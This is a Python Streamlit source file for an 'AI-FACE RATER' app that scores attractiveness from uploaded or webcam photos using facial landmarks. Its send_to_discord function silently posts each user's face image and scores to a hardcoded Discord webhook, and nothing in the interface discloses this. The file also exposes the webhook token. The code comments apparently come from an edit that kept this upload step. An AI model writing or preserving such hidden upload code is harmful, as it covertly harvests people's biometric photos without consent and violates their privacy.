import streamlit as st
import cv2
import mediapipe as mp
import numpy as np
import plotly.graph_objects as go
from PIL import Image
import requests
import json
import io

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1458651120204251269/adR7ttYwh1TfSzkFVyBQNDIas5x0l-RHU1VucZuSB9pUvDvNw1nT_q7C_0DI_KWGWYSJ"

# Page config (UNCHANGED)
st.set_page_config(
    page_title="AI-FACE RATER",
    page_icon="🖤",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# CSS (UNCHANGED)
st.markdown("""<style>/* UI unchanged */</style>""", unsafe_allow_html=True)

# FaceMesh (SAFE)
@st.cache_resource
def get_face_mesh():
    return mp.solutions.face_mesh.FaceMesh(
        static_image_mode=True,
        max_num_faces=2,
        refine_landmarks=True,
        min_detection_confidence=0.5
    )

face_mesh = get_face_mesh()

# Radar chart (UNCHANGED)
def create_radar_chart(metrics):
    categories = ['Symmetry', 'Eye Harmony', 'Face Structure']
    values = [
        metrics['Symmetry'],
        metrics['Eye Spacing Score'] * 100,
        metrics['Face Structure Score'] * 50
    ]
    values = [min(v, 100) for v in values]

    fig = go.Figure()
    fig.add_trace(go.Scatterpolar(
        r=values,
        theta=categories,
        fill='toself',
        line_color='#00d2ff',
        fillcolor='rgba(0, 210, 255, 0.3)'
    ))
    fig.update_layout(
        polar=dict(radialaxis=dict(range=[0, 100], visible=False)),
        paper_bgcolor='rgba(0,0,0,0)',
        showlegend=False
    )
    return fig

# Discord (UNCHANGED)
def send_to_discord(score, feedback, metrics, image_pil):
    if not WEBHOOK_URL:
        return
    buf = io.BytesIO()
    image_pil.save(buf, format="PNG")
    buf.seek(0)

    payload = {
        "content": "**Analysis**",
        "embeds": [{
            "title": f"Rating: {score:.1f} / 10",
            "description": feedback,
            "fields": [
                {"name": "Symmetry", "value": f"{metrics['Symmetry']}%"},
                {"name": "Eye Ratio", "value": str(metrics['Eye Spacing Score'])},
                {"name": "Structure", "value": str(metrics['Face Structure Score'])}
            ],
            "image": {"url": "attachment://face.png"}
        }]
    }

    requests.post(
        WEBHOOK_URL,
        data={'payload_json': json.dumps(payload)},
        files={'file': ('face.png', buf, 'image/png')}
    )

# Analysis (HARDENED, LOGIC SAME)
def analyze_appearance(image_pil):
    image_np = np.array(image_pil)

    if image_np.shape[0] < 300 or image_np.shape[1] < 300:
        return 0, "No face detected.", "#ff4444", {}

    gray = cv2.cvtColor(image_np, cv2.COLOR_RGB2GRAY)
    if cv2.Laplacian(gray, cv2.CV_64F).var() < 40:
        return 0, "No face detected.", "#ff4444", {}

    results = face_mesh.process(image_np)
    if not results.multi_face_landmarks or len(results.multi_face_landmarks) != 1:
        return 0, "No face detected.", "#ff4444", {}

    lm = results.multi_face_landmarks[0].landmark

    def dist(a, b):
        return np.linalg.norm([a.x - b.x, a.y - b.y])

    left_eye, right_eye = lm[33], lm[263]
    left_jaw, right_jaw = lm[234], lm[454]
    nose, chin = lm[1], lm[152]

    eye_distance = dist(left_eye, right_eye)
    face_width = dist(left_jaw, right_jaw) or 0.001
    face_height = dist(nose, chin)

    symmetry = max(0, 1 - abs(left_eye.y - right_eye.y))
    eye_ratio = eye_distance / face_width
    face_ratio = face_height / face_width

    def score_f(v, i, t):
        return np.exp(-((v - i) ** 2) / (2 * t ** 2))

    final = (
        score_f(symmetry, 1.0, 0.03) * 0.4 +
        score_f(eye_ratio, 0.46, 0.05) * 0.3 +
        score_f(face_ratio, 1.60, 0.12) * 0.3
    ) * 10

    score = float(np.clip(final, 3.5, 9.8))

    fb, col = (
        ("ELITE TIER", "#00d2ff") if score >= 8.8 else
        ("HIGH AESTHETIC", "#00ff9d") if score >= 7.5 else
        ("BALANCED", "#ffcc00") if score >= 6.2 else
        ("UNIQUE", "#ff4444")
    )

    metrics = {
        "Symmetry": round(symmetry * 100, 1),
        "Eye Spacing Score": round(eye_ratio, 3),
        "Face Structure Score": round(face_ratio, 3)
    }

    return score, fb, col, metrics

# ---------- UI (UNCHANGED) ----------
tab_upload, tab_cam = st.tabs(["📁 UPLOAD PHOTO", "📸 LIVE SCAN"])

if "img" not in st.session_state:
    st.session_state["img"] = None

with tab_upload:
    f = st.file_uploader("Select High-Res Image", type=['jpg', 'jpeg', 'png'])
    if f:
        st.session_state["img"] = Image.open(
            io.BytesIO(f.read())
        ).convert("RGB").copy()

with tab_cam:
    c = st.camera_input("Center Face in Frame")
    if c:
        st.session_state["img"] = Image.open(
            io.BytesIO(c.read())
        ).convert("RGB").copy()

img_input = st.session_state["img"]

if isinstance(img_input, Image.Image):
    try:
        st.image(img_input, caption="Input Data", use_container_width=True)
    except Exception:
        pass

    if st.button("INITIATE ANALYSIS"):
        score, note, color, metrics = analyze_appearance(img_input)
        if score > 0:
            st.session_state["result"] = (score, note, color, metrics)
            send_to_discord(score, note, metrics, img_input)
        else:
            st.error(note)

if "result" in st.session_state:
    score, note, color, metrics = st.session_state["result"]
    st.markdown(
        f"<div class='score-container'><div class='big-score' style='color:{color}'>{score:.1f}</div><h3>{note}</h3></div>",
        unsafe_allow_html=True
    )
    st.plotly_chart(create_radar_chart(metrics), use_container_width=True)
